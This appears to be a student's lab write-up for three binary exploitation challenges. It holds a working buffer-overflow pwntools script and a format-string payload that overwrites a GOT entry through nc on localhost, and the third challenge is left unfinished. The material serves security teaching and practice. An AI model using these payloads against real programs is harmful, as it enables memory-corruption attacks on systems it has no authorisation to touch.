z5181159
format-1
===========================

General overview of problems faced
-------------------------------------
Used bufferoverflow technique to overwrite memory address

List of vulnerabilities
--------------------
1. clear text string password

Steps to exploit
------------------
1. Overwrite memorry address till change is noticed in 9447
2. then change 9447 to FRND

Script/Command used
------------------
```
io = start()
print io.recvuntil("enter: ")
io.sendline("\x90"*512+"FRND")
io.interactive()
```
format-2...
=============
General overview of problems faced
-------------------------------------
Format String Vulnerability in Art of Exploitation and liveoverflow, completed bufferoverflow and format string challenges in protostar

List of vulnerabilities
--------------------
1. NO PIE
2. format specifier not used

Steps to exploit
------------------
1. Find the address of library function iin got
2. overwrite the address 1 bytes at a time

Script/Command used
------------------
```
(python -c "print '\xbc\xb4\x04\x08\xbd\xb4\x04\x08\xbe\xb4\x04\x08\xbf\xb4\x04\x08'+'%226x%3\$hhn%159x%4\$hhn%115x%5\$hhn%260x%6\$hhn'"; cat -)| nc localhost 7002
```
format-3...
=============
General overview of problems faced
-------------------------------------
Was unable to find absolute address of functions in Dynamic Relocation Records. Was able to leak memory address through do_gamble() by finding fibonacci numbers. But couldn't determine
address of library functions

List of vulnerabilities
--------------------


Steps to exploit
------------------


Script/Command used
------------------
```

```



